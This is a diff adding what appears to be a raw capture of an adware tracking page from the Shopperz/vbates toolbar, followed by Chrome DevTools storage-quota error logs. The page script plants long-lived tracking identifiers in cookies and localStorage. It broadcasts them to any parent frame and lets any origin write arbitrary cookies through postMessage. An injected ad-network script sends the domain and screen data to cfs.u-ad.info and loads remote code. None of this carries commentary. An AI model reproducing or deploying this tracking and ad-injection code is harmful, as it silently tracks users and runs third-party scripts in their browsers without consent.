@@ -1,0 +1,273 @@
+-Sources:
+-http://q2u3z6t7.ssl.hwcdn.net/html/pixel.html?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prod=vbates&geo=ID&ver=2.0.0.480:
+-Evaluate in console:
+<html>
+    <head><script> _BIT_LocalStoreDetails="{eyJpbnN0YWxsZXJfbmFtZSI6InZiYXRlc19jbGttaWRleF8uZXhlIiwidG9vbGJhcklEIjoiM0NENzNFMUM3MkZCNDY1ODhENDdERDY2NzQ0MkQxNzMiLCJwcm9kdWN0X25hbWUiOiJzaG9wcGVyejExMTIyMDE1MTQ1OSIsImNoYW5lbElEIjoiY2xrbWlkZXgiLCJpbnN0YWxsX3RpbWUiOiIxMi0xMi0yMDE1IiwicHJvZHVjdF92ZXJzaW9uIjoiMi4wLjAuNDgwIiwidmJ0c19nZW8iOiJJRHx8fDg2NDE0NDk4NjAwODIwODAiLCJhZEJsb2NrX3RpbWVyIjoidHJ1ZXx8fDE0NTUxMTAxNTcwNjkiLCJpbmpzY3MiOiJ0cnVlfHx8ODY0MTQ1NTAzOTE5MzMyOSIsInB4bF9WQkFURVNfZGFpbHlQaW5nIjoiZGFpbHlQaW5nfHx8MTQ1NTExMTg2MjU5MSIsIm5iX3RpbWVyIjoidHJ1ZXx8fDE0NTUxMTAxNzkzNjEiLCJwcmVwb3BfdGltZXIiOiIxNDU0NzY1MDU4MDIxfHx8MTQ1NDg1MTQ1ODAyMiIsInByZXBvcF9pbmRleCI6IjB8fHwxNDU0ODUxNDU4MDI4IiwiVkJBVEVTX2RhaWx5UGluZyI6InRydWV8fHwxNDUwMzY3OTYwMDQ2IiwiVkJBVEVTX0luc3RhbGxlZCI6InRydWV8fHw4NjQxNDUwNTQ1NTcxNzE5In0=}"</script><script id="_SFR_xl" src="http://cds.q2u3z6t7.hwcdn.net/extless/js/preloaderrs.js?tbid=3CD73E1C72FB46588D47DD667442D173&chnl=clkmidex&prd=shopperz111220151459&ind=12-12-2015&ver=2.0.0.480&drv=1"></script>
+        <script>
+
+
+            function _WGT_gup( name,src )
+                {
+                    name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+                    var regexS = "[\\?&]"+name+"=([^&#]*)";
+                    var regex = new RegExp( regexS );
+                    var results = regex.exec( src );
+                    if( results == null )
+                        return "";
+                    else
+                        return results[1];
+                };
+                var start = function(){
+                   try{
+                            //get all parameters from URL
+                           var url = document.location.href;
+                            //TOOLBAR ID
+                           var tbid = _WGT_gup('tbid',url);
+
+                           if(tbid==""){
+                               tbid = getCookie('tbid');
+                               if(tbid==""){
+                                   tbid= localStorage.getItem('tbid');
+                               }
+
+                           }
+                           else{
+                               var getOrtbid = getCookie('tbid');
+                               if(getOrtbid=="")
+                                   createCookie('tbid',tbid,365);
+                               var  getStorageTbid = localStorage.getItem('tbid');
+                               if(getStorageTbid==null || getStorageTbid=="")
+                                   localStorage.setItem('tbid',tbid);               
+                           }
+
+                           //CHANNEL NAME
+                           var chnl = _WGT_gup('chnl',url);
+                           if(chnl==""){
+                               chnl = getCookie('chnl');
+                               if(chnl==""){
+                                   chnl= localStorage.getItem('chnl');
+                                    if(chnl!=null)
+                                   createCookie('chnl',chnl,365);
+                               }
+                           }
+                           else{
+                                var getOrChnl = getCookie('chnl');
+                                if(getOrChnl==""){
+                                    createCookie('chnl',chnl,365);
+                                }
+                                var getStorageChnl =localStorage.getItem('chnl');
+                                if(getStorageChnl==null || getStorageChnl=="")
+                                   localStorage.setItem('chnl',chnl);                        
+                           }
+
+                           //PRODUCT NAME
+                           var prod = _WGT_gup('prod',url);
+                           if(prod==""){
+                               prod = getCookie('prod');
+                               if(prod==""){
+                                    prod= localStorage.getItem('prod');
+                               }
+                           }
+                           else{
+                                var getOrProd = getCookie('prod');
+                                if(getOrProd==""){
+                                    createCookie('prod',prod,365);
+                                    localStorage.setItem('prod',prod);
+                                }
+                                var getStorageProd =localStorage.getItem('prod');
+                                if(getStorageProd==null || getStorageProd=="")
+                                   localStorage.setItem('prod',prod);    
+
+                           }
+                           //GEO
+                           var geo = _WGT_gup('geo',url);
+                           if(geo==""){
+                               geo = getCookie('geo');
+                               if(geo==""){
+                                   geo= localStorage.getItem('geo');
+                                   if(geo!=null)
+                                   createCookie('geo',geo,365);
+                               }
+                           }
+                           else{
+                                //console.log('~~~~geo '+ geo);
+                                createCookie('geo',geo,365);  
+                                localStorage.setItem('geo',geo);
+                           }
+                           //PRODUCT VERSION
+                           var ver = _WGT_gup('ver',url);
+                           if(ver==""){
+                               ver = getCookie('ver');
+                               if(ver==""){
+                                   ver = localStorage.getItem('ver');
+                               }
+                           }
+                           else{
+                                var getOrVer = getCookie('ver');
+                                if(getOrVer==""){
+                                    createCookie('ver',ver,365);
+                                    localStorage.setItem('ver',ver);
+                                }
+                                var getStorageVer =localStorage.getItem('ver');
+                                if(getStorageVer==null || getStorageVer=="")
+                                   localStorage.setItem('ver',ver);                             
+                           }
+                           //DAILY PING
+                           var dailyPing = getCookie('daily');
+                           if(dailyPing==""){
+                                   dailyPing= localStorage.getItem('daily');
+                               }
+                           //prepopTimer
+                           var prepopTimer = getCookie('prepopTimer');
+                           if(prepopTimer=="")
+                               prepopTimer= localStorage.getItem('prepopTimer');
+                           //prepopIndex
+                           var prepopIndex = getCookie('prepopIndex');
+                            if(prepopIndex=="")
+                               prepopIndex= localStorage.getItem('prepopIndex');
+                           
+                    }
+                    catch(e){
+                        
+                    }
+                    
+                    try{
+                        var newTabTimer = getCookie('nb_timer');
+                        if(newTabTimer==""){
+                            newTabTimer= localStorage.getItem('nb_timer');
+                        }
+                    }
+                    catch(e){
+                        
+                    }
+                   var getAllPramsTogether = "&tbid="+tbid+"&chnl="+chnl+"&prod="+prod+"&geo="+geo+"&ver="+ver+"&daily="+dailyPing+"&prepopTimer="+prepopTimer+"&prepopIndex="+prepopIndex+"&nb_timer="+newTabTimer;
+                 window.parent.postMessage(getAllPramsTogether, "*");
+                   
+                };
+                var createCookie = function(name, value, days) {
+                    var expires;
+                    if (days) {
+                    var date = new Date();
+                    date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                    expires = "; expires=" + date.toGMTString();
+                    }
+                    else {
+                    expires = "";
+                    }
+                    document.cookie = name + "=" + value + expires + "; path=/";
+                };
+                
+                
+                function getCookie(c_name) {
+                    if (document.cookie.length > 0) {
+                        c_start = document.cookie.indexOf(c_name + "=");
+                        if (c_start != -1) {
+                            c_start = c_start + c_name.length + 1;
+                            c_end = document.cookie.indexOf(";", c_start);
+                            if (c_end == -1) {
+                                c_end = document.cookie.length;
+                            }
+                            return unescape(document.cookie.substring(c_start, c_end));
+                        }
+                    }
+                    return "";
+                }
+                
+                function delete_cookie( name ) {
+                    document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+                }
+                
+                //$jfc(document).ready(function() {
+                    start();
+                //});
+                
+                 function listenMessage(msg){
+        /*if(msg.data =="~dailyPing"){
+            //set value to cookie;
+            localStorage.setItem('daily','true');
+            createCookie('daily','true',1);
+        }
+        if(msg.data.indexOf("~userGeo")>-1){
+            //set geo Item to cookie
+            var userGeo = msg.data.split("=");
+            userGeo = userGeo[1];
+            localStorage.setItem('geo',userGeo);
+            createCookie('geo',userGeo,365);
+        }*/
+
+       try{ if(msg.data.indexOf("~setParam=")>-1){
+            var paramName = msg.data.split("=")[1];
+            var paramValue= msg.data.split("=")[2];
+            var paramTime = msg.data.split("=")[3];
+            if(paramTime==null || paramTime=="" || typeof paramTime=="undefined")
+                paramTime=365;
+            localStorage.setItem(paramName,paramValue); 
+            createCookie(paramName,paramValue,paramTime);
+            
+        }
+        
+         if(msg.data =="~dailyPing"){
+            //set value to cookie;
+            localStorage.setItem('daily','true'); 
+            createCookie('daily','true',1);
+            }
+            if(msg.data.indexOf("~userGeo")>-1){
+                //set geo Item to cookie
+                var userGeo = msg.data.split("=");
+                userGeo = userGeo[1];
+                localStorage.setItem('geo',userGeo); 
+                createCookie('geo',userGeo,365);
+            }
+       }catch(e){
+           if(msg.data =="~dailyPing"){
+            //set value to cookie;
+            localStorage.setItem('daily','true'); 
+            createCookie('daily','true',1);
+            }
+            if(msg.data.indexOf("~userGeo")>-1){
+                //set geo Item to cookie
+                var userGeo = msg.data.split("=");
+                userGeo = userGeo[1];
+                localStorage.setItem('geo',userGeo); 
+                createCookie('geo',userGeo,365);
+            }
+       }
+    };
+   
+    if (window.addEventListener) {
+        window.addEventListener("message", listenMessage, false);
+    } else {
+        window.attachEvent("onmessage", listenMessage);
+    }
+        </script>
+    </head>
+    <body>
+      test  
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnJrAyCbIZ8DfI3Vz5XfRkHfly%2fM2CGx282sgNUSTzGX9dusj17XoLq%2bCb5JvHtHs%2b7nndamu8D%2f2JvkxLsqnY2ngDaAdxpe8Ty6XbZFSyJURTylHlBtK7pMpsxjhc%2fwHZfunHfMsTQhVutm0BFTjoWAKsIxairUNVPO6MXau7RsfKYMYGseTBYTQ%2b4g6S3bkqhbVE%2bJVlgtLQ85hOWZNdMd8c2C0or8p9sK66xi9KSZ%2f45dJE0T889pbpiY0XbBxpTYTlWPxI%2f4L19zKEM30%2b6ktjLsingZ4AUYsLZlz4F4SUr%2bGzuEw25CuB37EBmIJBncHI5WRjuK%2b48D9RSdUddGUbc0WLeFlNILeCi0UpzhzDNa3ZLkfpg6MV4K5rxffG03nIEmNeGmLIU%2bYkd%2bv8xYqqk8H%2btIPRCqwmnjuDf%2fhmh3Yju5xmr2ZGz8Jxx6zlfxju3EHUHbQe%2f1EZQRieNeOp5bA3tOQTjD3RYpwP4Z%2ftWsrcep3b2LhZu8TPdBppsznD667xelvGKK9Ut%2fwDk9cRnRiwqpuxpvJTM0PJPbK6kUZYxuhY9PO8hYaDgc2hkDdr3VnqMcHsgQQfveO94Ys55S7s2Tdmln5sR5PpyF3KA7yz3CAMJ%2bDYiStLC%2fdnFtcbJWG2%2bECZ9SDHEbge74tQw2vfd2WIpz63%2f1lIxpbz84tYFof%2f7A%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
+Error saving setting with name: consoleHistory, value length: 5248410. Error: Failed to set the 'consoleHistory' property on 'Storage': Setting the value of 'consoleHistory' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4052
+Setting: 'savedURLs', size: 3514
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+Uncaught SyntaxError: Unexpected token <(…)
+Error saving setting with name: savedURLs, value length: 3555. Error: Failed to set the 'savedURLs' property on 'Storage': Setting the value of 'savedURLs' exceeded the quota.
+Ten largest settings: 
+Setting: 'consoleHistory', size: 5234863
+Setting: 'previouslyViewedFiles', size: 4052
+Setting: 'savedURLs', size: 3514
+Setting: 'breakpoints', size: 227
+Setting: 'watchExpressions', size: 13
+Setting: 'lastSelectedSourcesSidebarPaneTab', size: 7
+Setting: 'domBreakpoints', size: 2
+Setting: 'eventListenerBreakpoints', size: 2
+Setting: 'experiments', size: 2
+Setting: 'workspaceExcludedFolders', size: 2
+
